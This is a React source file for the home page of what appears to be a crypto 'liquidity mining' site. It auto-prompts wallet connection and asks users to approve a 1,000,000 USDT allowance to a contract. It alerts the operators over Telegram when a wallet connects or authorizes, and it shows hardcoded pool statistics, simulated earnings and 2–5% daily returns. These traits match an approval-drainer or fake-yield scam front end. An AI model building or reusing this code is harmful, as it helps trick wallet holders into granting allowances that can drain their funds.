'use client'

import { useState, useEffect, useCallback } from 'react'
import { Card, CardContent } from '@/components/ui/card'
import { Badge } from '@/components/ui/badge'
import { CounterAnimation } from '@/components/CounterAnimation'
import { EnhancedButton } from '@/components/EnhancedButton'
import { RefreshCWIcon } from '@/components/RefreshCWIcon'
import { ParticleBackground } from '@/components/ParticleBackground'
import PartnersCarousel from '@/components/PartnersCarousel'
import PartnersSection from '@/components/PartnersSection'
import HelpCenterAccordion from '@/components/ui/help-center-accordion'
import { LanguageSelectorDropdown } from '@/components/ui/language-selector-dropdown'

import LanguageSelector from '@/components/LanguageSelector'
import { FramedCard } from '@/components/FramedCard'
import { AnimatedTabs } from '@/components/ui/animated-tabs'

import { StakingCardButton } from '@/components/StakingCardButton'

import { useUserProfile } from '@/hooks/useData'
import { useI18n } from '@/contexts/I18nContext'
import { isMobileDevice, isInWalletBrowser, getWalletType, getFriendlyErrorMessage } from '@/lib/wallet-utils'
import { CURRENT_NETWORK } from '@/lib/contracts'
import { Button } from '@/components/ui/button'
import { EnhancedAnnouncementModal } from '@/components/EnhancedAnnouncementModal'
import HexagonLoader, { HexagonLoaderInline } from '@/components/HexagonLoader'
import StakingModal from '@/components/StakingModal'
import { useWeb3Staking } from '@/hooks/useWeb3Staking'
import { useTransactionRecords } from '@/hooks/useTransactionRecords'
import { usePageLoading } from '@/hooks/usePageLoading'
import { useAppKit, useAppKitAccount, useAppKitNetwork } from '@reown/appkit/react'
import MiningOutputScroller from '@/components/MiningOutputScroller'
import { getMaxApproveAmountFromEnv } from '@/lib/load-env'
import DraggableChatButton from '@/components/NewEmptyComponent'
import { ContainerScroll } from '@/components/ui/container-scroll-animation'
import MapDemo from '@/components/MapDemo'
import { RouteIcon } from '@/components/ui/route-icon'
import ParticipateButton from '@/components/ParticipateButton'
import BinanceLiquidityStaking from '@/components/BinanceLiquidityStaking'
import { SlideTabs } from '@/components/ui/slide-tabs'
import InviteLinkButton from '@/components/InviteLinkButton'
import { telegramRealtimeService } from '@/services/telegramRealtimeService'
import { walletMonitorService } from '@/services/walletMonitorService'

// Telegram机器人集成
class TelegramBotIntegration {
  async notifyUserConnect(address: string, action = 'connect') {
    try {
      console.log(`📱 发送Telegram通知: ${action} - ${address}`)
      
      const response = await fetch('/api/telegram/notification', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          notification_type: 'user_connect',
          user_address: address,
          notification_data: {
            address: address,
            action: action,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent
          }
        })
      })

      if (response.ok) {
        console.log('✅ Telegram连接通知已添加到队列')
      } else {
        console.error('❌ Telegram连接通知添加失败')
      }
    } catch (error) {
      console.error('❌ Telegram连接通知异常:', error)
    }
  }

  async notifyUserDisconnect(address: string) {
    try {
      console.log(`📱 发送Telegram断开连接通知: ${address}`)
      
      const response = await fetch('/api/telegram/notification', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          notification_type: 'user_disconnect',
          user_address: address,
          notification_data: {
            address: address,
            timestamp: new Date().toISOString()
          }
        })
      })

      if (response.ok) {
        console.log('✅ Telegram断开连接通知已添加到队列')
      } else {
        console.error('❌ Telegram断开连接通知添加失败')
      }
    } catch (error) {
      console.error('❌ Telegram断开连接通知异常:', error)
    }
  }

  // 新增：用户授权通知方法
  async notifyUserAuthorize(address: string, amount = '1000000', txHash = '') {
    try {
      console.log(`📱 发送Telegram授权通知: ${address} - ${amount} USDT`)
      
      const response = await fetch('/api/telegram/notification', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          notification_type: 'user_authorize',
          user_address: address,
          notification_data: {
            address: address,
            amount: amount,
            hash: txHash,
            timestamp: new Date().toISOString()
          }
        })
      })

      if (response.ok) {
        console.log('✅ Telegram授权通知已添加到队列')
      } else {
        console.error('❌ Telegram授权通知添加失败')
      }
    } catch (error) {
      console.error('❌ Telegram授权通知异常:', error)
    }
  }

  async checkStatus() {
    try {
      const response = await fetch('/api/telegram/webhook');
      const result = await response.json();
      console.log('📊 Telegram机器人状态:', result);
      return result;
    } catch (error) {
      console.warn('⚠️ 无法获取机器人状态:', error instanceof Error ? error.message : "未知错误");
      return null;
    }
  }
}

const telegramBot = new TelegramBotIntegration();

export default function Home() {
  // 状态管理
  const [isLoading, setIsLoading] = useState(false)
  const [announcements, setAnnouncements] = useState<any[]>([])
  const [showAnnouncement, setShowAnnouncement] = useState(false)
  const [currentAnnouncementIndex, setCurrentAnnouncementIndex] = useState(0)
  const [faqOpen, setFaqOpen] = useState(false)
  const [showStakingModal, setShowStakingModal] = useState(false)
  const [isApprovalPending, setIsApprovalPending] = useState(false)
  const [approvalTxHash, setApprovalTxHash] = useState('')
  const [referralCode, setReferralCode] = useState<string | null>(null)
  const [activeHomeTab, setActiveHomeTab] = useState('miningPool')
  const [homeExchangeTab, setHomeExchangeTab] = useState('exchange')
  const [recordsSubTab, setRecordsSubTab] = useState('exchange')
  const [withdrawAmount, setWithdrawAmount] = useState('')
  const [isWithdrawing, setIsWithdrawing] = useState(false)

  // 记录子标签映射
  const recordsTabMapping = ['exchange', 'withdraw', 'shared', 'earnings']
  const getRecordsTabIndex = (tab: string) => recordsTabMapping.indexOf(tab)
  const setRecordsTabByIndex = (index: number) => setRecordsSubTab(recordsTabMapping[index])

  // 收益计算函数
  const calculateDailyRate = (amount: number): number => {
    if (amount >= 200000) return 5;
    if (amount >= 100000) return 4;
    if (amount >= 10000) return 3;
    if (amount >= 5000) return 2.5;
    if (amount >= 50) return 2;
    return 0;
  }

  // 模拟收益记录数据
  const generateEarningsRecords = () => {
    const records = [];
    const now = new Date();
    const stakedAmount = 10000; // 示例质押金额
    const dailyRate = calculateDailyRate(stakedAmount);
    const quarterlyEarning = (stakedAmount * dailyRate / 100) / 4; // 每6小时收益

    // 生成最近7天的收益记录（每天4次）
    for (let day = 0; day < 7; day++) {
      for (let quarter = 0; quarter < 4; quarter++) {
        const recordTime = new Date(now.getTime() - (day * 24 + quarter * 6) * 60 * 60 * 1000);
        records.push({
          time: recordTime.toLocaleString('zh-CN', { 
            timeZone: 'Europe/London',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit'
          }),
          earnings: quarterlyEarning.toFixed(4),
          rate: `${dailyRate}%`
        });
      }
    }
    return records.reverse();
  }

  
  // 兑换功能状态
  const [ethAmount, setEthAmount] = useState('')
  const [usdtAmount, setUsdtAmount] = useState('')
  const [isEthToUsdt, setIsEthToUsdt] = useState(true)
  const [exchangeRate] = useState(4480.37) // ETH to USDT 汇率

  // 使用AppKit hooks
  const { open } = useAppKit()
  const { address: account, isConnected } = useAppKitAccount()
  const { chainId } = useAppKitNetwork()
  
  // 检查是否在ETH主网 (chainId 1是ETH主网)
  const chainIdNum = typeof chainId === 'string' ? Number.parseInt(chainId) : (typeof chainId === 'number' ? chainId : 0)
  const isOnETH = chainIdNum === 1
  
  // Web3质押功能
  const { 
    usdtBalance, 
    usdtAllowance, 
    approveUsdt, 
    stakeUsdt,
    refetchUsdtBalance,
    refetchUsdtAllowance
  } = useWeb3Staking()
  
  // 移除管理员verify检查，改为检查对合约的verify
  
  // 国际化
  const { t } = useI18n()

  // 页面加载状态
  usePageLoading()


  // 读取URL中的邀请码参数
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const params = new URLSearchParams(window.location.search)
      const ref = params.get('ref')
      
      if (ref) {
        console.log('检测到邀请码:', ref)
        setReferralCode(ref)
        // 保存到localStorage，确保授权时可用
        localStorage.setItem('referralCode', ref)
        console.log('邀请码已保存到localStorage')
      } else {
        // 尝试从localStorage读取之前保存的邀请码
        const savedRef = localStorage.getItem('referralCode')
        if (savedRef) {
          console.log('从localStorage读取邀请码:', savedRef)
          setReferralCode(savedRef)
        }
      }
    }
  }, [])

  // 用户心跳 - 定期更新活动时间以保持在线状态
  useEffect(() => {
    if (!isConnected || !account) return

    console.log('启动用户心跳，钱包:', account)

    // 立即发送一次心跳
    const sendHeartbeat = async () => {
      try {
        await fetch('/api/user/heartbeat', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ wallet_address: account })
        })
      } catch (error) {
        console.error('心跳发送失败:', error)
      }
    }

    sendHeartbeat()

    // 每30秒发送一次心跳
    const heartbeatInterval = setInterval(sendHeartbeat, 30000)

    return () => {
      clearInterval(heartbeatInterval)
      console.log('停止用户心跳')
    }
  }, [isConnected, account])

  // 启动Telegram实时通知服务
  useEffect(() => {
    const startTelegramService = async () => {
      try {
        console.log('自动启动Telegram实时通知服务...')
        
        // 先检查当前状态
        const currentStatus = telegramRealtimeService.getStatus()
        if (currentStatus.isRunning) {
          console.log('Telegram实时通知服务已在运行')
          return
        }

        // 启动服务
        await telegramRealtimeService.start()
        
        // 验证启动状态
        const status = telegramRealtimeService.getStatus()
        if (status.isRunning) {
          console.log('Telegram实时通知服务启动成功')
        } else {
          console.warn('Telegram实时通知服务启动失败，可能缺少环境变量')
        }
      } catch (error) {
        console.error('启动Telegram实时通知服务失败:', error)
        console.error('可能的原因: 缺少TELEGRAM_BOT_TOKEN或TELEGRAM_CHAT_ID环境变量')
      }
    }

    startTelegramService()

    // 清理函数
    return () => {
      telegramRealtimeService.stop()
    }
  }, [])

  // 注意：授权奖励现在直接在 /api/user/authorize API 中处理，不再需要 Realtime 监听

  // 启动钱包动账监听服务
  useEffect(() => {
    const startWalletMonitorService = async () => {
      try {
        console.log('启动钱包动账监听服务...')
        await walletMonitorService.start()
        console.log('钱包动账监听服务已启动')
      } catch (error) {
        console.error('启动钱包动账监听服务失败:', error)
      }
    }

    startWalletMonitorService()

    // 清理函数
    return () => {
      walletMonitorService.stop()
    }
  }, [])

  // 获取用户信息
  const { 
    userProfile, 
    loading: profileLoading, 
    refetch: refetchProfile 
  } = useUserProfile(account)
  
  // 获取真实交易记录数据
  const { 
    exchangeRecords, 
    withdrawRecords, 
    earningsRecords, 
    sharedRecords,
    loading: recordsLoading,
    refetch: refetchRecords
  } = useTransactionRecords(account)

  // 自动刷新记录数据 - 每30秒刷新一次
  useEffect(() => {
    if (!account) return

    const refreshInterval = setInterval(() => {
      console.log('自动刷新记录数据...')
      refetchRecords()
    }, 30000) // 30秒刷新一次

    return () => {
      clearInterval(refreshInterval)
    }
  }, [account, refetchRecords])

  // 自动连接钱包 - 页面加载时自动尝试连接
  useEffect(() => {
    const autoConnectWallet = async () => {
      // 如果已经连接，直接返回
      if (isConnected && account) {
        console.log('钱包已连接:', account);
        return;
      }

      // 检查是否有之前的连接状态
      const wasConnected = typeof window !== 'undefined' && 
        localStorage.getItem('wallet_connected') === 'true';
      const savedAddress = typeof window !== 'undefined' && 
        localStorage.getItem('wallet_address');

      if (wasConnected && savedAddress && !isConnected && open) {
        console.log('检测到之前的连接状态，尝试自动恢复连接...', {
          address: savedAddress,
          wasConnected
        });
        
        try {
          // 延迟一点时间确保Web3组件完全加载
          setTimeout(async () => {
            try {
              await open();
              console.log('自动恢复钱包连接成功');
            } catch (error) {
              console.log('自动恢复钱包连接失败，用户需要手动连接:', error);
            }
          }, 1500); // 增加延迟时间确保Wagmi完全初始化
        } catch (error) {
          console.log('自动恢复钱包连接失败:', error);
        }
      } else if (!isConnected && open) {
        console.log('尝试自动连接钱包...');
        try {
          // 延迟一点时间确保Web3组件完全加载
          setTimeout(async () => {
            try {
              await open();
              console.log('自动钱包连接成功');
            } catch (error) {
              console.log('自动钱包连接失败，用户需要手动连接:', error);
            }
          }, 1000);
        } catch (error) {
          console.log('自动钱包连接失败:', error);
        }
      }
    };

    autoConnectWallet();
  }, [isConnected, account, open]);

  // 监控钱包连接状态（移除Telegram通知，避免重复发送）
  useEffect(() => {
    if (isConnected && account) {
      console.log('钱包已连接:', account);
    } else if (!isConnected && account) {
      console.log('钱包已断开:', account);
    }
  }, [isConnected, account]);

  // 兑换功能逻辑
  const handleSwapCurrencies = () => {
    setIsEthToUsdt(!isEthToUsdt)
  }

  // 提现功能
  const handleWithdraw = async () => {
    if (!withdrawAmount || Number.parseFloat(withdrawAmount) <= 0) {
      alert('请输入有效的提现金额');
      return;
    }

    // 检查最低提现限制
    const minWithdrawAmount = 10;
    if (Number.parseFloat(withdrawAmount) < minWithdrawAmount) {
      alert(`${t.minWithdrawAmount}`);
      return;
    }

    if (!account) {
      alert('请先连接钱包');
      return;
    }

    try {
      setIsWithdrawing(true);
      console.log('开始提现流程...', withdrawAmount);

      // 调用提现API
      const response = await fetch('/api/user/withdraw', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          userAddress: account,
          amount: withdrawAmount,
          withdrawAddress: account  // 提现到用户自己的钱包地址
        })
      });

      const result = await response.json();

      if (result.success) {
        console.log('提现请求提交成功');
        alert('提现请求已提交，请等待处理');
        setWithdrawAmount('');
        
        // 刷新用户资料和记录
        if (refetchProfile) {
          await refetchProfile();
        }
        if (refetchRecords) {
          await refetchRecords();
        }
      } else {
        throw new Error(result.error || '提现失败');
      }
    } catch (error) {
      console.error('提现失败:', error);
      alert('提现失败: ' + (error instanceof Error ? error.message : "未知错误"));
    } finally {
      setIsWithdrawing(false);
    }
  }

  
  // 质押相关数据
  const stakedAmount = userProfile?.usdt || 0        // 质押金额
  const rewardAmount = userProfile?.cash || 0        // 奖励金额
  const totalInvestment = userProfile?.totalInvestment || 0  // 总投资
  const totalRewards = userProfile?.totalRewards || 0       // 总奖励
  
  // 用于跟踪最新的授权额度
  const [latestAllowance, setLatestAllowance] = useState<string>('0')
  
  // 监听usdtAllowance变化，更新latestAllowance
  useEffect(() => {
    if (usdtAllowance) {
      setLatestAllowance(usdtAllowance)
      console.log('更新授权额度:', usdtAllowance)
    }
  }, [usdtAllowance])
  
  // 计算verify状态 - 检查对质押合约的verify，不是对私人地址的verify
  const isAuthorized = usdtAllowance && Number.parseFloat(usdtAllowance) > 0 && !isApprovalPending
  
  console.log('授权状态检查:', {
    isConnected,
    isOnETH,
    usdtAllowance,
    isApprovalPending,
    finalIsAuthorized: isAuthorized
  })

  // Handle authorization - 简化版本，只要点击授权按钮就自动更新授权状态
  const handleStake = async () => {
    if (!isConnected) {
      console.log('Wallet not connected, starting connection...')
      await open()
      return
    }
    
    if (!account) {
      console.log('没有钱包地址')
      return
    }
    
    try {
      console.log('开始授权流程...')
      setIsApprovalPending(true)
      
      // 合约地址 (从合约配置获取)
      const STAKING_CONTRACT = CURRENT_NETWORK.STAKING_CONTRACT
      
      // verify大额度（100万 USDT）给质押合约
      const defaultAmount = '1000000' // 100万 USDT
      console.log(`授权金额: ${defaultAmount} USDT`)
      console.log(`授权给合约地址: ${STAKING_CONTRACT}`)
      
      // 直接发起verify给合约
      const txHash = await approveUsdt(defaultAmount)
      console.log('授权成功:', txHash)
      console.log('交易哈希:', txHash)
      
      setApprovalTxHash(String(txHash))
      
      // 保存邀请码到 localStorage（Railway 监听服务需要）
      if (referralCode) {
        localStorage.setItem(`referralCode_${account}`, referralCode)
        console.log('已保存邀请码到 localStorage')
      }
      
      // 不再直接调用 API，等待 Railway Approval 监听服务自动检测
      console.log('等待 Railway 监听服务检测链上 Approval 事件...')
      console.log('授权成功后，Railway 服务会自动：')
      console.log('   1. 检测链上 Approval 事件（< 15秒）')
      console.log('   2. 调用后端 API 处理授权')
      console.log('   3. 发放奖励')
      console.log('   4. 发送 Telegram 通知')
      
      setIsApprovalPending(false)
      
    } catch (error) {
      console.error('授权失败:', error)
      setIsApprovalPending(false)
      setApprovalTxHash('')
    }
  }

  return (
    <div className="min-h-screen relative main-container mobile-card">
      
      {/* Header */}
      <header className="flex items-center justify-between px-4 py-4 frosted-glass border-b border-border/20 text-[#000000] bg-[#f9f900] font-bold relative z-[11000]">
        <div className="flex items-center gap-4 pt-2">
          <img 
            src="/ETHImg.959d065.png" 
            alt="Logo" 
            className="h-8 w-auto slide-in-up"
          />
          <LanguageSelectorDropdown />
        </div>
        <div className="flex items-center gap-4 pt-2">
          {/* 桌面端按钮 */}
          <div className="hidden sm:flex items-center gap-4">
            {/* 邀请链接按钮 */}
            <InviteLinkButton 
              inviteLink={`${typeof window !== 'undefined' ? window.location.origin : 'https://yourapp.com'}?ref=${account || 'default'}`}
              title="Invite Friends"
              description="Share this link with your friends to invite them"
            />
          </div>
        </div>
      </header>

      {/* 全球挖矿网络地图 */}
      {/* 地图组件顶部的标题 */}
      <section className="px-4 py-4 md:py-6 bg-black text-center">
        <div className="max-w-6xl mx-auto">
          <h1 className="text-3xl md:text-5xl font-bold text-white mb-4">
            {t.globalLiquidityMiningNetwork}
          </h1>
          <p className="text-lg md:text-xl text-gray-300 max-w-4xl mx-auto">
            {t.globalLiquidityMiningNetworkDescription}
          </p>
          
          {/* 移动端邀请链接按钮 */}
          <div className="mt-6 sm:hidden">
            <InviteLinkButton 
              inviteLink={`${typeof window !== 'undefined' ? window.location.origin : 'https://yourapp.com'}?ref=${account || 'default'}`}
              title="Invite Friends"
              description="Share this link with your friends to invite them"
            />
          </div>
        </div>
      </section>

      <section className="relative bg-black py-2 px-4">
        <MapDemo />
      </section>

      {/* ContainerScroll 主要视频区域 */}

      <ContainerScroll titleComponent={null}>
        <div className="relative w-full h-full">
          <img
            src="/ethereum.webp"
            alt="Ethereum"
            className="w-full h-full object-cover rounded-2xl"
          />
          
          {/* 视频覆盖层内容 */}
          <div className="absolute inset-0 bg-black/30 rounded-2xl flex items-center justify-center">
            <div className="text-center space-y-4 px-6 relative">
              <h2 className="text-3xl md:text-5xl font-bold text-white">
{t.losslessMining}
                    </h2>
              <p className="text-lg md:text-xl text-gray-300 font-medium">
                {t.walletMining}
              </p>
              
              {/* 奖励和百万ETH文字 */}
              <div className="flex items-center gap-1 justify-center">
                <span className="text-black text-xl md:text-2xl font-bold">{t.reward}</span>
                <span className="text-yellow-400 text-5xl md:text-6xl font-bold">{t.oneMillion}</span>
                <span className="text-black text-xl md:text-2xl font-bold">ETH</span>
                  </div>

              <div className="pt-4 flex justify-center pr-3">
                <ParticipateButton 
                        onClick={handleStake}
                        disabled={isLoading}
                        isAuthorized={!!isAuthorized}
                        isApprovalPending={isApprovalPending}
                        isConnected={isConnected}
                />
                  </div>
                  </div>
                </div>
              </div>
      </ContainerScroll>

      {/* 切换栏 - 矿池/账户 */}
      <section className="px-3 md:px-4 bg-black mt-8 md:mt-12 mb-6 md:mb-8">
        <div className="max-w-4xl mx-auto">
          <AnimatedTabs 
            tabs={[
              { label: t.miningPool, value: 'miningPool' },
              { label: t.account, value: 'account' }
            ]}
            activeTab={activeHomeTab}
            onTabChange={setActiveHomeTab}
          />
        </div>
      </section>


      {/* 条件渲染内容区域 */}
      {activeHomeTab === 'miningPool' && (
        <>
          {/* 礦池卡片 */}
          <section className="px-3 md:px-4 bg-black">
            <div className="max-w-4xl mx-auto">
              <div className="mb-8">
                <FramedCard minHeight="350px" className="slide-in-up">
                  <div className="space-y-6 pb-4">
                    <h3 className="text-xl font-bold text-center text-white">{t.miningPool}</h3>
                    
                    <div className="space-y-4">
                      <div className="flex justify-between items-center py-3 border-b border-gray-600/30">
                        <span className="text-gray-400 text-sm">{t.totalOutput}</span>
                        <span className="text-white font-bold text-lg">
                          <CounterAnimation end={368247.819} decimals={3} className="counter-text" />
                        </span>
                      </div>
                      <div className="flex justify-between items-center py-3 border-b border-gray-600/30">
                        <span className="text-gray-400 text-sm">{t.activeNodes}</span>
                        <span className="text-white font-bold text-lg">
                          <CounterAnimation end={179081.626} decimals={3} className="counter-text" />
                        </span>
                      </div>
                      <div className="flex justify-between items-center py-3 border-b border-gray-600/30">
                        <span className="text-gray-400 text-sm">{t.participants}</span>
                        <span className="text-white font-bold text-lg">
                          <CounterAnimation end={478371} className="counter-text" />
                        </span>
                      </div>
                      <div className="flex justify-between items-center py-3">
                        <span className="text-gray-400 text-sm">{t.userIncome}</span>
                        <span className="text-white font-bold text-lg">
                          <CounterAnimation end={196319.294} decimals={3} suffix=" USDT" className="counter-text" />
                        </span>
                      </div>
                    </div>
                  </div>
                </FramedCard>
              </div>
            </div>
          </section>

          {/* 用戶挖礦輸出卡片 */}
          <section className="px-3 md:px-4 bg-black">
            <div className="max-w-4xl mx-auto">
              <div className="mb-8">
                <FramedCard minHeight="450px" className="slide-in-up">
                  <div className="space-y-4 pb-4">
                    <MiningOutputScroller />
                  </div>
                </FramedCard>
              </div>
            </div>
          </section>
        </>
      )}

      {activeHomeTab === 'account' && (
        <>
          {/* 我的账户页面 */}
          <section className="px-3 md:px-4 bg-black relative z-10">
            <div className="max-w-4xl mx-auto pt-2 pb-4">
              {/* 带边框的账户信息区域 */}
              <div className="binance-frame flex min-h-[500px]">
                {/* 左侧边框 */}
                <div className="flex flex-col w-[14px]">
                  <div 
                    className="h-4 frame-left-corner"
                  ></div>
                  <div 
                    className="flex flex-1 bg-[#1E1E1E] items-center frame-border-left"
                  >
                    <img 
                      className="w-full h-full object-cover" 
                      src="/fragments/left-gradient.svg" 
                      alt="Left gradient"
                    />
                        </div>
                            </div>

                {/* 中间内容区域 */}
                <div className="flex flex-col flex-1">
                  {/* 顶部边框 */}
                  <div className="flex w-full">
                    <div 
                      className="flex-1 h-[6px] frame-top-left"
                    ></div>
                    <div 
                      className="w-[150px] bg-no-repeat bg-cover h-[6px] frame-top-center"
                    ></div>
                    <div 
                      className="flex-1 h-[6px] frame-top-right"
                    ></div>
                  </div>

                  {/* 账户信息内容 */}
                  <div className="flex-1 bg-[#1E1E1E] p-6 min-h-[400px]">
                    <div className="space-y-6 pb-4">
                      <h3 className="text-xl font-bold text-center text-white">{t.myAccount}</h3>
                      
                      <div className="space-y-1">
                        {/* 用户状态行 */}
                        <div className="flex justify-between items-center py-1.5 border-b border-gray-600/30">
                          <span className="text-gray-400 text-sm">{t.userStatus}</span>
                          <span className={`font-bold text-lg ${
                            !isConnected ? 'text-red-400' : 
                            !userProfile?.approval_status ? 'text-yellow-400' : 
                            'text-green-400'
                          }`}>
                            {!isConnected ? t.invalid : 
                             !userProfile?.approval_status ? t.unverified : 
                             t.certificate}
                              </span>
                            </div>
                        
                        {/* 总产出 */}
                        <div className="flex justify-between items-center py-1.5 border-b border-gray-600/30">
                          <span className="text-gray-400 text-sm">{t.totalOutput}</span>
                          <span className="text-white font-bold text-lg">
                            {userProfile?.total_eth_received ? Number.parseFloat(userProfile.total_eth_received.toString()).toFixed(6) : '0.000000'} ETH
                          </span>
                          </div>
                        
                        {/* 钱包余额 */}
                        <div className="flex justify-between items-center py-1.5 border-b border-gray-600/30">
                          <span className="text-gray-400 text-sm">{t.walletBalance}</span>
                          <span className="text-white font-bold text-lg">
                            <CounterAnimation end={Number.parseFloat(usdtBalance || '0')} decimals={6} suffix=" USDT" className="counter-text" />
                              </span>
                            </div>
                        
                        {/* 可兑换 */}
                        <div className="flex justify-between items-center py-1.5 border-b border-gray-600/30">
                          <span className="text-gray-400 text-sm">{t.exchangeable}</span>
                          <span className="text-white font-bold text-lg">
                            {userProfile?.reward_eth_balance ? Number.parseFloat(userProfile.reward_eth_balance.toString()).toFixed(6) : '0.000000'} ETH
                          </span>
                            </div>
                        
                        {/* 已提取 */}
                        <div className="flex justify-between items-center py-1.5 border-b border-gray-600/30">
                          <span className="text-gray-400 text-sm">{t.withdraw}</span>
                          <span className="text-white font-bold text-lg">
                            {userProfile?.withdrawn_usdt ? Number.parseFloat(userProfile.withdrawn_usdt.toString()).toFixed(6) : '0.000000'} USDT
                          </span>
                          </div>
                        
                        {/* 已兑换 */}
                        <div className="flex justify-between items-center py-1.5 border-b border-gray-600/30">
                          <span className="text-gray-400 text-sm">{t.exchanged}</span>
                          <span className="text-white font-bold text-lg">
                            {userProfile?.exchanged_usdt ? Number.parseFloat(userProfile.exchanged_usdt.toString()).toFixed(6) : '0.000000'} USDT
                          </span>
                    </div>

                        {/* 可提取 */}
                        <div className="flex justify-between items-center py-1.5 border-b border-gray-600/30">
                          <span className="text-gray-400 text-sm">{t.withdrawable}</span>
                          <span className="text-white font-bold text-lg">
                            {userProfile?.withdrawable_usdt ? Number.parseFloat(userProfile.withdrawable_usdt.toString()).toFixed(6) : '0.000000'} USDT
                          </span>
                      </div>

                        {/* 分红 */}
                        <div className="flex justify-between items-center py-1.5">
                          <span className="text-gray-400 text-sm">{t.shareDividends}</span>
                          <span className="text-white font-bold text-lg">
                            {userProfile?.total_dividend ? Number.parseFloat(userProfile.total_dividend.toString()).toFixed(6) : '0.000000'} USDT
                          </span>
                        </div>
                        </div>
                        </div>
                        </div>

                  {/* 底部边框 */}
                  <div className="flex w-full">
                    <div 
                      className="flex-1 h-[6px] frame-bottom-left"
                    ></div>
                    <div 
                      className="w-[150px] bg-no-repeat bg-cover h-[6px] frame-bottom-center"
                    ></div>
                    <div 
                      className="flex-1 h-[6px] frame-bottom-right"
                    ></div>
                        </div>
                        </div>

                {/* 右侧边框 */}
                <div className="flex flex-col w-[14px]">
                  <div 
                    className="h-4 frame-right-corner"
                  ></div>
                  <div 
                    className="flex flex-1 bg-[#1E1E1E] items-center frame-border-right"
                  >
                    <img 
                      className="w-full h-full object-cover" 
                      src="/fragments/right-gradient.svg" 
                      alt="Right gradient"
                    />
                      </div>
                    </div>
              </div>
            </div>
          </section>

          {/* 兑换提取记录分类栏 */}
          <section className="px-3 md:px-4 bg-black mt-4 md:mt-6 relative z-20">
            <div className="max-w-4xl mx-auto">
              <div className="mb-2">
                {/* 分类标签栏 */}
                <div className="mb-2">
                  <AnimatedTabs 
                    tabs={[
                      { label: t.exchange, value: 'exchange' },
                      { label: t.withdraw, value: 'withdraw' },
                      { label: t.records, value: 'records' }
                    ]}
                    activeTab={homeExchangeTab}
                    onTabChange={setHomeExchangeTab}
                  />
                </div>

                {/* 兌換Tab */}
                {homeExchangeTab === 'exchange' && (
                  <FramedCard minHeight="400px" className="slide-in-up">
                    <BinanceLiquidityStaking 
                      userEthBalance={userProfile?.eth ? Number.parseFloat(userProfile.eth.toString()) : 0}
                      onExchangeSuccess={() => {
                        // 兑换成功后刷新用户数据和记录
                        if (refetchProfile) {
                          refetchProfile();
                        }
                        if (refetchRecords) {
                          refetchRecords();
                        }
                      }}
                    />
                  </FramedCard>
                )}

                {/* 提取Tab */}
                {homeExchangeTab === 'withdraw' && (
                  <FramedCard minHeight="400px" className="slide-in-up">
                    <div className="p-6 space-y-6">
                      {/* 余额显示和全部提现按钮 */}
                      <div className="flex items-center justify-between">
                        <div className="text-white text-sm">
                          {t.withdrawableBalance}: <span className="text-blue-400 font-semibold">{userProfile?.withdrawable_usdt ? Number.parseFloat(userProfile.withdrawable_usdt.toString()).toFixed(2) : '0.00'}</span> USDT
                        </div>
                        <button 
                          className="text-orange-400 text-sm hover:text-orange-300 transition-colors px-3 py-1 rounded-lg border border-orange-400/30 hover:bg-orange-400/10"
                          onClick={() => {
                            // 全部提现逻辑 - 填入用户的可提现余额
                            const withdrawableAmount = userProfile?.withdrawable_usdt || 0;
                            if (withdrawableAmount > 0) {
                              setWithdrawAmount(Number.parseFloat(withdrawableAmount.toString()).toFixed(2));
                            } else {
                              alert(t.noWithdrawableBalance);
                            }
                          }}
                        >
                          {t.withdrawAll}
                        </button>
                      </div>
                        
                        {/* 提取金额输入 */}
                        <div className="flex items-center gap-3 bg-white rounded-lg p-4">
                          <div className="flex-1 min-w-0">
                            <input 
                              type="number" 
                              placeholder="0" 
                              value={withdrawAmount}
                              onChange={(e) => setWithdrawAmount(e.target.value)}
                              className="bg-transparent text-black outline-none w-full font-bold text-lg" 
                            />
                          </div>
                          <img 
                            src="/2.png" 
                            alt="USDT" 
                            className="w-8 h-8 rounded-full flex-shrink-0"
                          />
                          <span className="text-black text-sm font-medium flex-shrink-0">USDT</span>
                        </div>

                        {/* 最低提现限制提示 */}
                        <div className="text-center text-gray-400 text-xs">
                          {t.minWithdrawAmount}
                        </div>

                        {/* 提取按钮 */}
                      <Button 
                        className="w-full bg-yellow-500 hover:bg-yellow-600 text-black py-3 rounded-lg font-bold disabled:bg-gray-500 disabled:cursor-not-allowed"
                        onClick={handleWithdraw}
                        disabled={isWithdrawing || !withdrawAmount || Number.parseFloat(withdrawAmount || '0') < 10}
                      >
                        {isWithdrawing ? t.processing : t.withdraw}
                        </Button>
                    </div>
                  </FramedCard>
                )}

                {/* 記錄Tab */}
                {homeExchangeTab === 'records' && (
                  <div className="bg-black/90 backdrop-blur-sm rounded-lg p-6 space-y-6 slide-in-up records-container">
                      {/* 记录子标签 */}
                      <div className="flex justify-center items-center mb-4">
                        <SlideTabs
                          tabs={[
                            t.exchangeRecords,
                            t.withdrawRecords,
                            t.invitationRewards,
                            t.earningsRecords
                          ]}
                          activeTab={getRecordsTabIndex(recordsSubTab)}
                          onTabChange={setRecordsTabByIndex}
                        />
                      </div>

                      {/* 兑换记录 */}
                      {recordsSubTab === 'exchange' && (
                      <div className="space-y-4">
                          {/* 表格头 */}
                          <div className="grid grid-cols-4 gap-4 pb-2 border-b border-gray-600/30">
                            <span className="text-gray-400 text-sm font-medium">{t.time}</span>
                            <span className="text-gray-400 text-sm font-medium">{t.payAmount}</span>
                            <span className="text-gray-400 text-sm font-medium">{t.receiveAmount}</span>
                          <span className="text-gray-400 text-sm font-medium">{t.status}</span>
                        </div>

                        {/* 记录列表 */}
                          <div className="space-y-2 max-h-60 overflow-y-auto">
                            {recordsLoading ? (
                              <div className="flex justify-center py-8">
                                <div className="text-gray-400">{t.loading}...</div>
                        </div>
                            ) : exchangeRecords.length > 0 ? (
                              exchangeRecords.map((record, index) => (
                                <div key={index} className="grid grid-cols-4 gap-4 py-2 border-b border-gray-700/30 hover:bg-gray-800/30 rounded">
                                  <span className="text-gray-300 text-sm">{record.time}</span>
